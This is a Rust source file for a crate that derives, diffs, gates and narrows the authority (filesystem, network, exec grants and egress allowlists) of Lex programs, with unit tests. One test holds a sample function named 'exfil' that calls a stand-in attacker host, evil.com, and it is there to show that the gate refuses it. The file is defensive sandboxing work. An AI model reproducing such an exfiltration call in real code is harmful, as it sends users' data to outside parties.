//! Authority derivation — *the sandbox is compiled, not configured.*
//!
//! `lex-os-check` answers one question: **does this program fit the
//! grant a human wrote?** That is a policy check, and every stack has
//! one. This crate answers the two questions a stack without an effect
//! system cannot answer at all:
//!
//! 1. **What is the least authority this program provably needs?**
//!    Not "what did it touch on the run we traced" — what it *can*
//!    touch on every path, read off the declared effect rows the type
//!    checker has already proven honest. [`derive`] folds those rows
//!    into the minimal [`Grant`] in the trust lattice, and
//!    [`Authority::minimality_witness`] shows the answer is tight:
//!    lowering any one dimension by a single rank rejects a declared
//!    effect.
//! 2. **What did this change do to that authority?** [`diff`] compares
//!    two derivations and classifies the delta as
//!    [`Verdict::Narrowing`], [`Verdict::Unchanged`] or
//!    [`Verdict::Widening`]. That delta is the review artifact: a diff
//!    can be read for what the code now *does*, but only this says what
//!    the code may now *reach*.
//!
//! Together they make a process out of the wall. The grant stops being
//! a file someone maintains alongside the code — drifting wider every
//! time a deploy breaks, never narrower because nobody dares remove a
//! permission — and becomes a derived artifact that moves in both
//! directions with the source it came from:
//!
//! ```text
//!   agent writes code
//!        │
//!   lex-os authority derive   →  least grant the code provably needs
//!        │
//!   lex-os authority diff     →  authority delta vs the last approved code
//!        │                        ├─ narrowing  → applied automatically
//!        │                        └─ widening   → refused; needs a human
//!   lex-os authority gate     →  CI verdict, bound to the source
//!        │
//!   lex-os authority narrow   →  manifest tightened to the derivation
//!        │
//!   lex-os run                →  perimeter derived from *that* manifest
//! ```
//!
//! ## What this crate deliberately does not claim
//!
//! The trust lattice ranks three dimensions — filesystem, network,
//! exec. Plenty of effects sit outside it (`env`, `sql`, `approval`,
//! `chat`, `a2a`, `kv`, …): [`lex_types::trust::effect_requirement`]
//! maps them to nothing, so *no* grant refuses them and a grant-only
//! diff would show nothing when a program starts reading environment
//! variables. [`AuthorityDiff`] reports those separately as
//! [`AuthorityDiff::off_lattice_added`] — they widen what the program
//! can reach and belong in the review, while being honest that the
//! perimeter is not what stops them.

use lex_os_manifest::Manifest;
use lex_types::trust::{
    effect_requirement, host_matches, is_net_effect, Dimension, Grant, GrantId, Level, TrustError,
};
use lex_types::types::{EffectArg, EffectKind};
use lex_types::EffectSet;
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;

/// Why an authority derivation failed.
#[derive(Debug, thiserror::Error)]
pub enum AuthorityError {
    /// The source did not parse or did not type-check. A program whose
    /// effect rows are dishonest has no derivable authority: the whole
    /// derivation rests on the rows being a sound over-approximation of
    /// the body, which is exactly what the type checker establishes.
    #[error(transparent)]
    Check(#[from] lex_os_check::CheckError),
    /// A level that means nothing on the dimension it was folded into.
    /// Unreachable through [`derive`] (the fold only ever joins levels
    /// `effect_requirement` produced for that dimension) but the
    /// constructor is fallible and silently substituting a level is the
    /// one thing this crate must never do.
    #[error(transparent)]
    Trust(#[from] TrustError),
}

/// The authority a program requires, derived from its own types.
///
/// Every field is a consequence of the source, never of a policy file:
/// two derivations of the same source are identical, and a derivation
/// is a function of the source alone.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Authority {
    /// The least grant in the trust lattice that permits every effect
    /// the program declares. Minimal by construction — see
    /// [`Authority::minimality_witness`].
    pub grant: Grant,
    /// The minimal egress allowlist: every host a `net("host")` effect
    /// names, sorted. A program with only host-scoped network effects
    /// needs exactly these hosts and no others.
    pub egress: Vec<String>,
    /// True when the program carries a bare `[net]` somewhere — network
    /// code whose host the type level does not bind (`std.net.get`
    /// takes its URL at runtime). The static answer is then "may reach
    /// the network", and *which host* is a perimeter question. Tracked
    /// because losing host precision is a widening even when the coarse
    /// network level is unchanged.
    pub unscoped_net: bool,
    /// Path scopes named by `fs_read` / `fs_walk` effects, sorted.
    pub fs_read: Vec<String>,
    /// Path scopes named by `fs_write` effects, sorted.
    pub fs_write: Vec<String>,
    /// Every effect kind the program declares, sorted — including the
    /// ones the lattice does not rank.
    pub effects: Vec<String>,
    /// Declared effects that [`effect_requirement`] maps to no
    /// dimension, sorted. No grant refuses these; they are surfaced so
    /// a review sees them anyway.
    pub off_lattice: Vec<String>,
}

impl Authority {
    /// Content address of the derived grant — a stable id for "this
    /// exact authority", so an approval can be bound to it.
    pub fn grant_id(&self) -> GrantId {
        self.grant.content_id()
    }

    /// Evidence that the derived grant is *tight*: for every dimension
    /// above `none`, the next level down rejects at least one effect
    /// the program declares.
    ///
    /// This is the claim the whole process rests on, so it is computed
    /// rather than asserted in prose: a caller can print it, and the
    /// crate's own tests check it over every derivation they build.
    /// An empty vector means the grant is [`Grant::bottom`] — the
    /// program needs no authority at all, which is as tight as it gets.
    pub fn minimality_witness(&self, effects: &EffectSet) -> Vec<MinimalityWitness> {
        let mut out = Vec::new();
        for dim in Dimension::ALL {
            let level = self.grant.level(dim);
            let Some(lower) = next_level_down(dim, level) else {
                continue; // already `none` on this dimension
            };
            let mut probe = self.grant;
            match dim {
                Dimension::Filesystem => probe.filesystem = lower,
                Dimension::Network => probe.network = lower,
                Dimension::Exec => probe.exec = lower,
            }
            // The probe must fail, and the effect it fails on is the
            // reason this dimension is where it is.
            if let Err(TrustError::EffectNotPermitted { effect, .. }) =
                probe.permits_effects(effects)
            {
                out.push(MinimalityWitness {
                    dimension: dim,
                    level,
                    lowered_to: lower,
                    rejected_effect: effect,
                });
            }
        }
        out
    }
}

/// One dimension's proof that the derived level is not one rank too
/// generous: at `lowered_to`, `rejected_effect` no longer type-checks.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MinimalityWitness {
    pub dimension: Dimension,
    pub level: Level,
    pub lowered_to: Level,
    pub rejected_effect: String,
}

/// The level one rank below `level` on `dim`, or `None` if `level` is
/// already the bottom of that dimension's ladder.
fn next_level_down(dim: Dimension, level: Level) -> Option<Level> {
    let ladder = dim.levels();
    let idx = ladder.iter().position(|l| l.rank() == level.rank())?;
    idx.checked_sub(1).map(|i| ladder[i])
}

/// Derive the least authority `src` provably needs.
///
/// Parses, canonicalizes and type-checks through the real Lex
/// front-end (so dishonest effect rows are rejected before anything is
/// derived from them), then folds the declared effects into a grant.
pub fn derive(src: &str) -> Result<(Authority, EffectSet), AuthorityError> {
    let effects = lex_os_check::effects_of_source(src)?;
    let authority = derive_from_effects(&effects)?;
    Ok((authority, effects))
}

/// The fold itself, over an [`EffectSet`] a caller already has.
///
/// Each effect names a dimension and the minimum level it needs; the
/// grant's level on a dimension is the join (the maximum) over every
/// effect that touches it. That makes the result minimal by
/// construction: drop any dimension a rank and the effect that pushed
/// it there stops being permitted.
pub fn derive_from_effects(effects: &EffectSet) -> Result<Authority, AuthorityError> {
    let (mut filesystem, mut network, mut exec) = (Level::None, Level::None, Level::None);
    let mut egress = BTreeSet::new();
    let mut fs_read = BTreeSet::new();
    let mut fs_write = BTreeSet::new();
    let mut kinds = BTreeSet::new();
    let mut off_lattice = BTreeSet::new();
    let mut unscoped_net = false;

    for e in &effects.concrete {
        kinds.insert(e.name.clone());
        match effect_requirement(&e.name) {
            Some((Dimension::Filesystem, required)) => filesystem = filesystem.join(required),
            Some((Dimension::Network, required)) => network = network.join(required),
            Some((Dimension::Exec, required)) => exec = exec.join(required),
            None => {
                off_lattice.insert(e.name.clone());
            }
        }
        if is_net_effect(&e.name) {
            match scope_arg(e) {
                Some(host) => {
                    egress.insert(host.to_string());
                }
                None => unscoped_net = true,
            }
        }
        match (e.name.as_str(), scope_arg(e)) {
            ("fs_read" | "fs_walk", Some(p)) => {
                fs_read.insert(p.to_string());
            }
            ("fs_write", Some(p)) => {
                fs_write.insert(p.to_string());
            }
            _ => {}
        }
    }

    Ok(Authority {
        grant: Grant::try_new(filesystem, network, exec)?,
        egress: egress.into_iter().collect(),
        unscoped_net,
        fs_read: fs_read.into_iter().collect(),
        fs_write: fs_write.into_iter().collect(),
        effects: kinds.into_iter().collect(),
        off_lattice: off_lattice.into_iter().collect(),
    })
}

/// The string argument of a scoped effect (`net("host")`,
/// `fs_read("/path")`), if it has one.
fn scope_arg(e: &EffectKind) -> Option<&str> {
    match &e.arg {
        Some(EffectArg::Str(s)) => Some(s.as_str()),
        _ => None,
    }
}

// ---------------------------------------------------------------- diff

/// How a change moved a program's authority.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Verdict {
    /// The head needs exactly what the base needed.
    Unchanged,
    /// The head needs strictly less. Safe to apply without asking: the
    /// type checker has proved the removed authority is unreachable.
    Narrowing,
    /// The head reaches somewhere the base could not. Any widening
    /// dominates any narrowing in the same change.
    Widening,
}

impl Verdict {
    pub fn as_str(self) -> &'static str {
        match self {
            Verdict::Unchanged => "unchanged",
            Verdict::Narrowing => "narrowing",
            Verdict::Widening => "widening",
        }
    }
}

/// One dimension's movement between two derivations.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DimensionDelta {
    pub dimension: Dimension,
    pub from: Level,
    pub to: Level,
}

impl DimensionDelta {
    pub fn widens(&self) -> bool {
        self.to.rank() > self.from.rank()
    }
}

/// The authority delta between two versions of a program — the artifact
/// a reviewer reads next to the source diff.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AuthorityDiff {
    /// Dimensions whose level moved, in [`Dimension::ALL`] order.
    pub dimensions: Vec<DimensionDelta>,
    /// Hosts the head reaches that the base did not.
    pub egress_added: Vec<String>,
    /// Hosts the base reached that the head no longer does.
    pub egress_removed: Vec<String>,
    /// Filesystem path scopes the head claims and the base did not.
    pub fs_read_added: Vec<String>,
    pub fs_write_added: Vec<String>,
    /// Path scopes the head gives up.
    pub fs_read_removed: Vec<String>,
    pub fs_write_removed: Vec<String>,
    /// Effect kinds outside the trust lattice that the head declares
    /// and the base did not — `env`, `sql`, `approval`, … No grant
    /// refuses these, which is exactly why a review should see them.
    pub off_lattice_added: Vec<String>,
    pub off_lattice_removed: Vec<String>,
    /// The head carries a bare `[net]` where the base's network reach
    /// was real and fully host-scoped: the same coarse level, less
    /// static precision, so it counts as a widening.
    pub lost_net_precision: bool,
    pub verdict: Verdict,
}

impl AuthorityDiff {
    /// True when nothing moved at all.
    pub fn is_empty(&self) -> bool {
        self.verdict == Verdict::Unchanged
    }
}

/// Compare two derivations.
pub fn diff(base: &Authority, head: &Authority) -> AuthorityDiff {
    let mut dimensions = Vec::new();
    for dim in Dimension::ALL {
        let (from, to) = (base.grant.level(dim), head.grant.level(dim));
        if from.rank() != to.rank() {
            dimensions.push(DimensionDelta {
                dimension: dim,
                from,
                to,
            });
        }
    }

    let egress_added = added(&base.egress, &head.egress);
    let egress_removed = added(&head.egress, &base.egress);
    let fs_read_added = added(&base.fs_read, &head.fs_read);
    let fs_read_removed = added(&head.fs_read, &base.fs_read);
    let fs_write_added = added(&base.fs_write, &head.fs_write);
    let fs_write_removed = added(&head.fs_write, &base.fs_write);
    let off_lattice_added = added(&base.off_lattice, &head.off_lattice);
    let off_lattice_removed = added(&head.off_lattice, &base.off_lattice);
    // Only a *loss* of precision counts: the base must actually have had
    // network reach, and had it fully bound to hosts. Going from no
    // network at all to a bare `[net]` is already reported as a
    // dimension widening; saying it twice would read as two findings.
    let lost_net_precision = head.unscoped_net && !base.unscoped_net && !base.egress.is_empty();

    let widens = dimensions.iter().any(DimensionDelta::widens)
        || !egress_added.is_empty()
        || !fs_read_added.is_empty()
        || !fs_write_added.is_empty()
        || !off_lattice_added.is_empty()
        || lost_net_precision;
    let narrows = dimensions.iter().any(|d| !d.widens())
        || !egress_removed.is_empty()
        || !fs_read_removed.is_empty()
        || !fs_write_removed.is_empty()
        || !off_lattice_removed.is_empty()
        || (base.unscoped_net && !head.unscoped_net);

    let verdict = if widens {
        Verdict::Widening
    } else if narrows {
        Verdict::Narrowing
    } else {
        Verdict::Unchanged
    };

    AuthorityDiff {
        dimensions,
        egress_added,
        egress_removed,
        fs_read_added,
        fs_read_removed,
        fs_write_added,
        fs_write_removed,
        off_lattice_added,
        off_lattice_removed,
        lost_net_precision,
        verdict,
    }
}

/// Entries of `b` not present in `a`.
fn added(a: &[String], b: &[String]) -> Vec<String> {
    let have: BTreeSet<&str> = a.iter().map(String::as_str).collect();
    b.iter()
        .filter(|x| !have.contains(x.as_str()))
        .cloned()
        .collect()
}

// ---------------------------------------------------------------- gate

/// Authority a manifest grants that the code does not use — the
/// over-grant a hand-written policy accumulates and never sheds.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Slack {
    /// Dimensions the manifest ranks above what the code needs.
    pub dimensions: Vec<DimensionDelta>,
    /// Allowlisted hosts no `net("host")` effect names. Only meaningful
    /// when the program's network reach is fully host-scoped: under a
    /// bare `[net]` any of them could be the runtime target, so the
    /// list is empty rather than misleadingly long.
    pub unused_egress: Vec<String>,
}

impl Slack {
    pub fn is_empty(&self) -> bool {
        self.dimensions.is_empty() && self.unused_egress.is_empty()
    }
}

/// The verdict of gating derived authority against an approved grant.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct GateReport {
    pub allowed: bool,
    /// Why it was refused, one line per violation. Empty when allowed.
    pub violations: Vec<String>,
    /// Authority granted but not needed. Reported on an *allowed* gate
    /// too: over-grant is not a failure, it is the thing
    /// [`narrow_manifest`] removes.
    pub slack: Slack,
}

/// Check derived authority against the grant + egress allowlist a human
/// approved.
///
/// The refusal semantics match `lex-os check`'s wall exactly — the
/// coarse level check plus the per-host egress check — so the gate and
/// the wall can never disagree about the same program. What the gate
/// adds is the other direction: the slack.
pub fn gate(approved: &Grant, approved_egress: &[String], head: &Authority) -> GateReport {
    let mut violations = Vec::new();

    for dim in Dimension::ALL {
        let (need, have) = (head.grant.level(dim), approved.level(dim));
        if !need.leq(have) {
            violations.push(format!(
                "{dim}: code needs `{need}` but the approved grant is `{have}`"
            ));
        }
    }

    if approved.network != Level::Full {
        for host in &head.egress {
            if !approved_egress.iter().any(|e| host_matches(e, host)) {
                violations.push(format!(
                    "network: code reaches `{host}`, which is not in the approved egress allowlist \
                     ({} entr{})",
                    approved_egress.len(),
                    if approved_egress.len() == 1 { "y" } else { "ies" }
                ));
            }
        }
    }

    let mut slack_dims = Vec::new();
    for dim in Dimension::ALL {
        let (need, have) = (head.grant.level(dim), approved.level(dim));
        if need.rank() < have.rank() {
            slack_dims.push(DimensionDelta {
                dimension: dim,
                from: have,
                to: need,
            });
        }
    }
    // Under a bare `[net]` the runtime host is not known statically, so
    // no allowlist entry can be called unused without risking a
    // narrowing that breaks the program.
    let unused_egress = if head.unscoped_net {
        Vec::new()
    } else {
        approved_egress
            .iter()
            .filter(|entry| !head.egress.iter().any(|h| host_matches(entry, h)))
            .cloned()
            .collect()
    };

    GateReport {
        allowed: violations.is_empty(),
        violations,
        slack: Slack {
            dimensions: slack_dims,
            unused_egress,
        },
    }
}

/// Tighten `manifest` to the authority `head` provably needs.
///
/// Narrowing only, in both senses: each dimension becomes the *meet* of
/// the manifest's level and the derived one (so this can never hand a
/// program more than a human approved, even if the derivation asks for
/// more — that case is the gate's refusal, not this function's job),
/// and egress keeps only the entries some `net("host")` effect matches.
///
/// The result is the manifest the perimeter should actually be derived
/// from: same grant type, same content addressing, strictly less reach.
pub fn narrow_manifest(manifest: &Manifest, head: &Authority) -> Result<Manifest, AuthorityError> {
    let grant = Grant::try_new(
        manifest.grant.filesystem.meet(head.grant.filesystem),
        manifest.grant.network.meet(head.grant.network),
        manifest.grant.exec.meet(head.grant.exec),
    )?;
    let egress = if head.unscoped_net {
        manifest.egress.clone()
    } else {
        manifest
            .egress
            .iter()
            .filter(|entry| head.egress.iter().any(|h| host_matches(entry, h)))
            .cloned()
            .collect()
    };
    let mut out = manifest.clone();
    out.grant = grant;
    out.egress = egress;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn derive_ok(src: &str) -> (Authority, EffectSet) {
        derive(src).expect("derives")
    }

    const PURE: &str = r#"
fn add(a :: Int, b :: Int) -> Int { a + b }
"#;

    const READ_ONLY: &str = r#"
import "std.io" as io
fn analyze(path :: Str) -> [io] Result[Str, Str] { io.read(path) }
"#;

    // Same off-lattice surface as READ_ONLY, plus scoped network — so a
    // diff against READ_ONLY isolates exactly the network movement.
    const IO_PLUS_NET: &str = r#"
import "std.io" as io
import "std.net" as net
fn fetch(p :: Str) -> [io, net, net("results.demo.internal")] Result[Str, Str] {
  net.get("https://results.demo.internal/submit")
}
"#;

    const SCOPED_NET: &str = r#"
import "std.net" as net
fn submit(b :: Str) -> [net, net("results.demo.internal")] Result[Str, Str] {
  net.get("https://results.demo.internal/submit")
}
"#;

    #[test]
    fn pure_code_needs_nothing() {
        let (a, _) = derive_ok(PURE);
        assert_eq!(a.grant, Grant::bottom());
        assert!(a.egress.is_empty());
        assert!(!a.unscoped_net);
    }

    #[test]
    fn io_is_off_lattice_not_filesystem() {
        // `std.io.read` carries `[io]`, which the lattice does not rank.
        // The derivation must not invent filesystem authority for it —
        // and must still surface it for review.
        let (a, _) = derive_ok(READ_ONLY);
        assert_eq!(a.grant, Grant::bottom());
        assert_eq!(a.off_lattice, vec!["io".to_string()]);
    }

    #[test]
    fn net_derives_allowlist_and_its_hosts() {
        let (a, _) = derive_ok(SCOPED_NET);
        assert_eq!(a.grant.network, Level::Allowlist);
        assert_eq!(a.grant.filesystem, Level::None);
        assert_eq!(a.grant.exec, Level::None);
        assert_eq!(a.egress, vec!["results.demo.internal".to_string()]);
        // `std.net.get`'s own effect is bare, so precision is partial.
        assert!(a.unscoped_net);
    }

    /// The claim the whole process rests on: the derived grant is tight.
    #[test]
    fn derived_grant_is_minimal() {
        for src in [PURE, READ_ONLY, SCOPED_NET, IO_PLUS_NET] {
            let (a, effects) = derive_ok(src);
            // It permits what the program declares...
            a.grant.permits_effects(&effects).expect("permits");
            // ...and every non-`none` dimension is one rank from refusing.
            for dim in Dimension::ALL {
                if let Some(lower) = next_level_down(dim, a.grant.level(dim)) {
                    let mut probe = a.grant;
                    match dim {
                        Dimension::Filesystem => probe.filesystem = lower,
                        Dimension::Network => probe.network = lower,
                        Dimension::Exec => probe.exec = lower,
                    }
                    assert!(
                        probe.permits_effects(&effects).is_err(),
                        "{dim} at {} is one rank too generous for {src}",
                        a.grant.level(dim)
                    );
                }
            }
            // And the witness agrees, one entry per non-`none` dimension.
            let witness = a.minimality_witness(&effects);
            let non_none = Dimension::ALL
                .iter()
                .filter(|d| a.grant.level(**d) != Level::None)
                .count();
            assert_eq!(witness.len(), non_none);
        }
    }

    #[test]
    fn adding_network_is_a_widening() {
        let (base, _) = derive_ok(READ_ONLY);
        let (head, _) = derive_ok(IO_PLUS_NET);
        let d = diff(&base, &head);
        assert_eq!(d.verdict, Verdict::Widening);
        assert_eq!(d.egress_added, vec!["results.demo.internal".to_string()]);
        // Nothing but the network moved.
        assert!(d.off_lattice_added.is_empty());
        assert!(d
            .dimensions
            .iter()
            .any(|x| x.dimension == Dimension::Network && x.widens()));
    }

    #[test]
    fn removing_network_is_a_narrowing() {
        let (base, _) = derive_ok(IO_PLUS_NET);
        let (head, _) = derive_ok(READ_ONLY);
        let d = diff(&base, &head);
        assert_eq!(d.verdict, Verdict::Narrowing);
        assert_eq!(d.egress_removed, vec!["results.demo.internal".to_string()]);
    }

    #[test]
    fn same_source_is_unchanged() {
        let (a, _) = derive_ok(SCOPED_NET);
        let (b, _) = derive_ok(SCOPED_NET);
        assert_eq!(diff(&a, &b).verdict, Verdict::Unchanged);
        assert_eq!(a.grant_id(), b.grant_id());
    }

    #[test]
    fn a_widening_dominates_a_narrowing_in_the_same_change() {
        let base = Authority {
            grant: Grant::try_new(Level::ReadWrite, Level::None, Level::None).unwrap(),
            egress: vec![],
            unscoped_net: false,
            fs_read: vec![],
            fs_write: vec![],
            effects: vec!["fs_write".into()],
            off_lattice: vec![],
        };
        let head = Authority {
            grant: Grant::try_new(Level::ReadOnly, Level::Allowlist, Level::None).unwrap(),
            egress: vec!["api.example.com".into()],
            unscoped_net: false,
            fs_read: vec![],
            fs_write: vec![],
            effects: vec!["fs_read".into(), "net".into()],
            off_lattice: vec![],
        };
        assert_eq!(diff(&base, &head).verdict, Verdict::Widening);
    }

    /// The lattice ranks three dimensions; plenty of authority sits
    /// outside it. A grant-only diff would show nothing here — which is
    /// precisely why the review artifact reports it separately.
    #[test]
    fn off_lattice_authority_is_a_widening_no_grant_would_catch() {
        let (base, _) = derive_ok(PURE);
        let with_env = r#"
import "std.env" as env
fn who() -> [env] Option[Str] { env.get("HOME") }
"#;
        let (head, effects) = derive_ok(with_env);
        assert_eq!(head.grant, Grant::bottom());
        // Every grant permits it, up to and including `bottom`.
        Grant::bottom()
            .permits_effects(&effects)
            .expect("permitted");
        let d = diff(&base, &head);
        assert_eq!(d.verdict, Verdict::Widening);
        assert_eq!(d.off_lattice_added, vec!["env".to_string()]);
        assert!(d.dimensions.is_empty());
    }

    #[test]
    fn gate_refuses_authority_beyond_the_approval() {
        let (head, _) = derive_ok(SCOPED_NET);
        let approved = Grant::try_new(Level::ReadOnly, Level::None, Level::None).unwrap();
        let r = gate(&approved, &[], &head);
        assert!(!r.allowed);
        assert!(r.violations.iter().any(|v| v.starts_with("network:")));
    }

    #[test]
    fn gate_reports_slack_on_an_over_broad_manifest() {
        let (head, _) = derive_ok(SCOPED_NET);
        let approved = Grant::try_new(Level::Full, Level::Full, Level::Full).unwrap();
        let r = gate(&approved, &["results.demo.internal:443".into()], &head);
        assert!(r.allowed);
        // filesystem full→none and exec full→none are pure over-grant.
        assert_eq!(r.slack.dimensions.len(), 3);
    }

    #[test]
    fn gate_refuses_a_host_outside_the_allowlist() {
        let evil = r#"
import "std.net" as net
fn exfil(s :: Str) -> [net, net("evil.com")] Result[Str, Str] {
  net.get("https://evil.com/collect")
}
"#;
        let (head, _) = derive_ok(evil);
        let approved = Grant::try_new(Level::None, Level::Allowlist, Level::None).unwrap();
        let r = gate(&approved, &["results.demo.internal:443".into()], &head);
        assert!(!r.allowed);
        assert!(r.violations.iter().any(|v| v.contains("evil.com")));
    }

    #[test]
    fn narrowing_never_widens_past_the_manifest() {
        // A manifest stingier than the code needs stays stingy: the
        // gate refuses that program, narrowing does not rescue it.
        let (head, _) = derive_ok(SCOPED_NET);
        let m = Manifest {
            grant: Grant::try_new(Level::None, Level::None, Level::None).unwrap(),
            egress: vec![],
            ..demo_manifest()
        };
        let out = narrow_manifest(&m, &head).unwrap();
        assert_eq!(out.grant, m.grant);
    }

    fn demo_manifest() -> Manifest {
        use lex_os_manifest::{Budget, Goal, IsolationFloor};
        Manifest {
            goal: Goal {
                description: "t".into(),
                done_signal: Some("DONE".into()),
            },
            grant: Grant::try_new(Level::Full, Level::Allowlist, Level::Full).unwrap(),
            budget: Budget {
                wall_clock_secs: 60,
                max_commands: 10,
                max_money_cents: 10,
                max_api_calls: 10,
            },
            isolation_floor: IsolationFloor::MicroVm,
            egress: vec![
                "results.demo.internal:443".into(),
                "unused.example:443".into(),
            ],
            actuation: None,
            facets: Default::default(),
            comment: None,
        }
    }

    #[test]
    fn narrowing_sheds_unused_dimensions() {
        let (head, _) = derive_ok(SCOPED_NET);
        let out = narrow_manifest(&demo_manifest(), &head).unwrap();
        assert_eq!(out.grant.filesystem, Level::None);
        assert_eq!(out.grant.exec, Level::None);
        assert_eq!(out.grant.network, Level::Allowlist);
        // `std.net.get` carries a bare `[net]`, so the runtime host is
        // not statically known and the allowlist is left alone. Shedding
        // an entry here would be a narrowing the types do not support.
        assert_eq!(out.egress, demo_manifest().egress);
    }

    #[test]
    fn narrowing_sheds_unused_egress_when_every_host_is_bound() {
        // Only host-scoped network effects: the set of reachable hosts
        // *is* known statically, so the unused allowlist entry goes.
        let scoped_only = r#"
fn reach() -> [net("results.demo.internal")] Int { 1 }
"#;
        let (head, _) = derive_ok(scoped_only);
        assert!(!head.unscoped_net);
        let out = narrow_manifest(&demo_manifest(), &head).unwrap();
        assert_eq!(out.egress, vec!["results.demo.internal:443".to_string()]);
    }
}
